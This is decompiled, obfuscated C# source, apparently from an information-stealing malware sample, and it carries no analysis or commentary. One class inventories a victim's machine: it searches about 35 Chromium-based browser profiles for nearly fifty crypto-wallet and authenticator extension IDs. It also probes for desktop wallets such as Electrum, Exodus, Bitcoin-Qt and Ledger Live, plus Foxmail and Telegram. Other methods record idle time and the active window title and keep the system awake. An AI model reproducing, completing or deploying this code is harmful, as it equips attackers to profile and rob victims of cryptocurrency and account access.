using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

// Token: 0x02000008 RID: 8
internal static class Class3
{
	// Token: 0x0600001C RID: 28 RVA: 0x00006FD8 File Offset: 0x000051D8
	internal static string smethod_0()
	{
		if (Class3.string_0 == null)
		{
			Class3.a a = new Class3.a();
			a.field_a = new List<string>();
			for (;;)
			{
				try
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					a.b = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					try
					{
						a.c = new Dictionary<string, string>
						{
							{
								"ibnejdfjmmkpcnlpebklmnkoeoihofec",
								"TronLink"
							},
							{
								"nkbihfbeogaeaoehlefnkodbefgpgknn",
								"MetaMask"
							},
							{
								"fhbohimaelbohpjbbldcngcnapndodjp",
								"Binance Chain Wallet"
							},
							{
								"ffnbelfdoeiohenkjibnmadjiehjhajb",
								"Yoroi"
							},
							{
								"cjelfplplebdjjenllpjcblmjkfcffne",
								"Jaxx Liberty"
							},
							{
								"fihkakfobkmkjojpchpfgcmhfjnmnfpi",
								"BitApp Wallet"
							},
							{
								"kncchdigobghenbbaddojjnnaogfppfj",
								"iWallet"
							},
							{
								"aiifbnbfobpmeekipheeijimdpnlpgpp",
								"Terra Station"
							},
							{
								"ijmpgkjfkbfhoebgogflfebnmejmfbml",
								"BitClip"
							},
							{
								"blnieiiffboillknjnepogjhkgnoapac",
								"EQUAL Wallet"
							},
							{
								"amkmjjmmflddogmhpjloimipbofnfjih",
								"Wombat"
							},
							{
								"jbdaocneiiinmjbjlgalhcelgbejmnid",
								"Nifty Wallet"
							},
							{
								"afbcbjpbpfadlkmhmclhkeeodmamcflc",
								"Math Wallet"
							},
							{
								"hpglfhgfnhbgpjdenjgmdgoeiappafln",
								"Guarda"
							},
							{
								"aeachknmefphepccionboohckonoeemg",
								"Coin98 Wallet"
							},
							{
								"imloifkgjagghnncjkhggdhalmcnfklk",
								"Trezor Password Manager"
							},
							{
								"oeljdldpnmdbchonielidgobddffflal",
								"EOS Authenticator"
							},
							{
								"gaedmjdfmmahhbjefcbgaolhhanlaolb",
								"Authy"
							},
							{
								"ilgcnhelpchnceeipipijaljkblbcobl",
								"GAuth Authenticator"
							},
							{
								"bhghoamapcdpbohphigoooaddinpkbai",
								"Authenticator"
							},
							{
								"mnfifefkajgofkcjkemidiaecocnkjeh",
								"TezBox"
							},
							{
								"dkdedlpgdmmkkfjabffeganieamfklkm",
								"Cyano Wallet"
							},
							{
								"aholpfdialjgjfhomihkjbmgjidlcdno",
								"Exodus Web3"
							},
							{
								"jiidiaalihmmhddjgbnbgdfflelocpak",
								"BitKeep"
							},
							{
								"hnfanknocfeofbddgcijnmhnfnkdnaad",
								"Coinbase Wallet"
							},
							{
								"egjidjbpglichdcondbcbdnbeeppgdph",
								"Trust Wallet"
							},
							{
								"hmeobnfnfcmdkdcmlblgagmfpfboieaf",
								"XDEFI Wallet"
							},
							{
								"bfnaelmomeimhlpmgjnjophhpkkoljpa",
								"Phantom"
							},
							{
								"fcckkdbjnoikooededlapcalpionmalo",
								"MOBOX WALLET"
							},
							{
								"bocpokimicclpaiekenaeelehdjllofo",
								"XDCPay"
							},
							{
								"flpiciilemghbmfalicajoolhkkenfel",
								"ICONex"
							},
							{
								"hfljlochmlccoobkbcgpmkpjagogcgpk",
								"Solana Wallet"
							},
							{
								"cmndjbecilbocjfkibfbifhngkdmjgog",
								"Swash"
							},
							{
								"cjmkndjhnagcfbpiemnkdpomccnjblmj",
								"Finnie"
							},
							{
								"dmkamcknogkgcdfhhbddcghachkejeap",
								"Keplr"
							},
							{
								"kpfopkelmapcoipemfendmdcghnegimn",
								"Liquality Wallet"
							},
							{
								"hgmoaheomcjnaheggkfafnjilfcefbmo",
								"Rabet"
							},
							{
								"fnjhmkhhmkbjkkabndcnnogagogbneec",
								"Ronin Wallet"
							},
							{
								"klnaejjgbibmhlephnhpmaofohgkpgkd",
								"ZilPay"
							},
							{
								"ejbalbakoplchlghecdalmeeeajnimhm",
								"MetaMask"
							},
							{
								"ghocjofkdpicneaokfekohclmkfmepbp",
								"Exodus Web3"
							},
							{
								"heaomjafhiehddpnmncmhhpjaloainkn",
								"Trust Wallet"
							},
							{
								"hkkpjehhcnhgefhbdcgfkeegglpjchdc",
								"Braavos Smart Wallet"
							},
							{
								"akoiaibnepcedcplijmiamnaigbepmcb",
								"Yoroi"
							},
							{
								"djclckkglechooblngghdinmeemkbgci",
								"MetaMask"
							},
							{
								"acdamagkdfmpkclpoglgnbddngblgibo",
								"Guarda Wallet"
							},
							{
								"okejhknhopdbemmfefjglkdfdhpfmflg",
								"BitKeep"
							},
							{
								"mijjdbgpgbflkaooedaemnlciddmamai",
								"Waves Keeper"
							}
						};
						Dictionary<string, string> dictionary = new Dictionary<string, string>();
						dictionary.Add("Chromium\\User Data\\", "Chromium");
						dictionary.Add("Google\\Chrome\\User Data\\", "Chrome");
						dictionary.Add("Google(x86)\\Chrome\\User Data\\", "Chrome");
						dictionary.Add("BraveSoftware\\Brave-Browser\\User Data\\", "Brave");
						dictionary.Add("Microsoft\\Edge\\User Data\\", "Edge");
						dictionary.Add("Tencent\\QQBrowser\\User Data\\", "QQBrowser");
						dictionary.Add("MapleStudio\\ChromePlus\\User Data\\", "ChromePlus");
						dictionary.Add("Iridium\\User Data\\", "Iridium");
						dictionary.Add("7Star\\7Star\\User Data\\", "7Star");
						dictionary.Add("CentBrowser\\User Data\\", "CentBrowser");
						dictionary.Add("Chedot\\User Data\\", "Chedot");
						dictionary.Add("Vivaldi\\User Data\\", "Vivaldi");
						dictionary.Add("Kometa\\User Data\\", "Kometa");
						dictionary.Add("Elements Browser\\User Data\\", "Elements");
						dictionary.Add("Epic Privacy Browser\\User Data\\", "Epic Privacy");
						dictionary.Add("uCozMedia\\Uran\\User Data\\", "Uran");
						dictionary.Add("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\", "Sleipnir5");
						dictionary.Add("CatalinaGroup\\Citrio\\User Data\\", "Citrio");
						dictionary.Add("Coowon\\Coowon\\User Data\\", "Coowon");
						dictionary.Add("liebao\\User Data\\", "liebao");
						dictionary.Add("QIP Surf\\User Data\\", "QIP Surf");
						dictionary.Add("Orbitum\\User Data\\", "Orbitum");
						dictionary.Add("Comodo\\Dragon\\User Data\\", "Dragon");
						dictionary.Add("Amigo\\User\\User Data\\", "Amigo");
						dictionary.Add("Torch\\User Data\\", "Torch");
						dictionary.Add("Comodo\\User Data\\", "Comodo");
						dictionary.Add("360Browser\\Browser\\User Data\\", "360Browser");
						dictionary.Add("Maxthon3\\User Data\\", "Maxthon3");
						dictionary.Add("K-Melon\\User Data\\", "K-Melon");
						dictionary.Add("Sputnik\\Sputnik\\User Data\\", "Sputnik");
						dictionary.Add("Nichrome\\User Data\\", "Nichrome");
						dictionary.Add("CocCoc\\Browser\\User Data\\", "CocCoc");
						dictionary.Add("Uran\\User Data\\", "Uran");
						dictionary.Add("Chromodo\\User Data\\", "Chromodo");
						dictionary.Add("Mail.Ru\\Atom\\User Data\\", "Atom");
						a.d = new object();
						Parallel.ForEach<KeyValuePair<string, string>>(dictionary, new Action<KeyValuePair<string, string>>(a.method_a));
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "atomic", "Local Storage", "leveldb")).Exists)
						{
							a.field_a.Add("Atomic Wallet");
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Bitcoin\\Bitcoin-Qt", RegistryKeyPermissionCheck.ReadSubTree))
						{
							if (registryKey != null && new DirectoryInfo(Path.Combine(registryKey.GetValue("strDataDir").ToString(), "wallets")).Exists)
							{
								a.field_a.Add("Bitcoin-Qt");
							}
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Dash\\Dash-Qt", RegistryKeyPermissionCheck.ReadSubTree))
						{
							if (registryKey2 != null && new DirectoryInfo(Path.Combine(new string[]
							{
								registryKey2.GetValue("strDataDir").ToString()
							})).Exists)
							{
								a.field_a.Add("Dash-Qt");
							}
						}
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "Electrum", "wallets")).Exists)
						{
							a.field_a.Add("Electrum");
						}
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "Ethereum", "keystore")).Exists)
						{
							a.field_a.Add("Ethereum");
						}
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "Exodus", "exodus.wallet")).Exists)
						{
							a.field_a.Add("Exodus");
						}
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "com.liberty.jaxx", "IndexedDB")).Exists)
						{
							a.field_a.Add("Jaxx");
						}
					}
					catch
					{
					}
					try
					{
						using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Litecoin\\Litecoin-Qt", RegistryKeyPermissionCheck.ReadWriteSubTree))
						{
							if (registryKey3 != null && new DirectoryInfo(Path.Combine(new string[]
							{
								registryKey3.GetValue("strDataDir").ToString()
							})).Exists)
							{
								a.field_a.Add("Litecoin-Qt");
							}
						}
					}
					catch
					{
					}
					try
					{
						if (new DirectoryInfo(Path.Combine(folderPath, "Zcash")).Exists)
						{
							a.field_a.Add("Zcash");
						}
					}
					catch
					{
					}
					try
					{
						DirectoryInfo[] directories = new DirectoryInfo(Path.GetPathRoot(folderPath)).GetDirectories("*", SearchOption.TopDirectoryOnly);
						for (int i = 0; i < directories.Length; i++)
						{
							if (directories[i].Name.ToLower().Contains("Foxmail"))
							{
								a.field_a.Add("Foxmail");
								break;
							}
						}
					}
					catch
					{
					}
					try
					{
						if (new FileInfo(Path.Combine(folderPath, "Telegram Desktop", "Telegram.exe")).Exists)
						{
							a.field_a.Add("Telegram");
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
				try
				{
					FileInfo fileInfo = new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Replace(" (x86)", null), "Ledger Live", "Ledger Live.exe"));
					if (fileInfo.Exists)
					{
						a.field_a.Add(Path.GetFileNameWithoutExtension(fileInfo.Name));
					}
					break;
				}
				catch
				{
					break;
				}
			}
			if (a.field_a.Count <= 0)
			{
				Class3.string_0 = "N/A";
			}
			else
			{
				a.field_a = a.field_a.Distinct<string>().ToList<string>();
				Class3.string_0 = string.Join(", ", a.field_a);
			}
		}
		return Class3.string_0;
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00007AB0 File Offset: 0x00005CB0
	internal static int smethod_1()
	{
		int result;
		try
		{
			Class0.Struct0 @struct = default(Class0.Struct0);
			@struct.uint_0 = (uint)Marshal.SizeOf(@struct);
			Class0.GetLastInputInfo(ref @struct);
			result = (int)TimeSpan.FromMilliseconds((double)((long)Environment.TickCount - (long)((ulong)@struct.uint_1))).TotalSeconds;
		}
		catch
		{
			result = -1;
		}
		return result;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x00007B18 File Offset: 0x00005D18
	internal static string smethod_2()
	{
		string result;
		try
		{
			Class0.Struct0 @struct = default(Class0.Struct0);
			@struct.uint_0 = (uint)Marshal.SizeOf(@struct);
			Class0.GetLastInputInfo(ref @struct);
			TimeSpan timeSpan = TimeSpan.FromMilliseconds(Environment.TickCount - (int)@struct.uint_1);
			result = string.Format("{0}d {1}h {2}m {3}s", new object[]
			{
				timeSpan.Days,
				timeSpan.Hours,
				timeSpan.Minutes,
				timeSpan.Seconds
			});
		}
		catch
		{
			result = "-1";
		}
		return result;
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00007BC8 File Offset: 0x00005DC8
	internal static string d()
	{
		string result = "";
		try
		{
			IntPtr foregroundWindow = Class0.GetForegroundWindow();
			StringBuilder stringBuilder = new StringBuilder(256);
			if (Class0.GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
			{
				result = stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00007C18 File Offset: 0x00005E18
	internal static void smethod_3()
	{
		try
		{
			Class0.SetThreadExecutionState((Class0.Enum0)2147483651U);
		}
		catch
		{
		}
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static Class3()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000022 RID: 34 RVA: 0x0000235D File Offset: 0x0000055D
	internal static bool smethod_4()
	{
		return Class3.object_0 == null;
	}

	// Token: 0x0400000F RID: 15
	private static string string_0;

	// Token: 0x04000010 RID: 16
	internal static object object_0;

	// Token: 0x02000009 RID: 9
	[CompilerGenerated]
	private sealed class a
	{
		// Token: 0x06000024 RID: 36 RVA: 0x00007C48 File Offset: 0x00005E48
		internal void method_a(KeyValuePair<string, string> kvp)
		{
			Class3.b b = new Class3.b();
			b.c = this;
			b.field_a = kvp;
			try
			{
				string path = Path.Combine(this.b, b.field_a.Key);
				b.field_b = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);
				Parallel.ForEach<KeyValuePair<string, string>>(this.c, new Action<KeyValuePair<string, string>>(b.method_a));
			}
			catch
			{
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002308 File Offset: 0x00000508
		// Note: this type is marked as 'beforefieldinit'.
		static a()
		{
			Class16.kLjw4iIsCLsZtxc4lksN0j();
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002367 File Offset: 0x00000567
		internal static bool smethod_0()
		{
			return Class3.a.a_0 == null;
		}

		// Token: 0x04000011 RID: 17
		public List<string> field_a;

		// Token: 0x04000012 RID: 18
		public string b;

		// Token: 0x04000013 RID: 19
		public Dictionary<string, string> c;

		// Token: 0x04000014 RID: 20
		public object d;

		// Token: 0x04000015 RID: 21
		private static Class3.a a_0;
	}

	// Token: 0x0200000A RID: 10
	[CompilerGenerated]
	private sealed class b
	{
		// Token: 0x06000028 RID: 40 RVA: 0x00007CC0 File Offset: 0x00005EC0
		internal void method_a(KeyValuePair<string, string> kvp)
		{
			try
			{
				string[] array = this.field_b;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].Contains(kvp.Key))
					{
						for (;;)
						{
							string item = this.field_a.Value + ":" + kvp.Value;
							object d = this.c.d;
							lock (d)
							{
								this.c.field_a.Add(item);
								break;
							}
						}
						break;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002308 File Offset: 0x00000508
		// Note: this type is marked as 'beforefieldinit'.
		static b()
		{
			Class16.kLjw4iIsCLsZtxc4lksN0j();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002371 File Offset: 0x00000571
		internal static bool smethod_0()
		{
			return Class3.b.b_0 == null;
		}

		// Token: 0x04000016 RID: 22
		public KeyValuePair<string, string> field_a;

		// Token: 0x04000017 RID: 23
		public string[] field_b;

		// Token: 0x04000018 RID: 24
		public Class3.a c;

		// Token: 0x04000019 RID: 25
		internal static Class3.b b_0;
	}
}
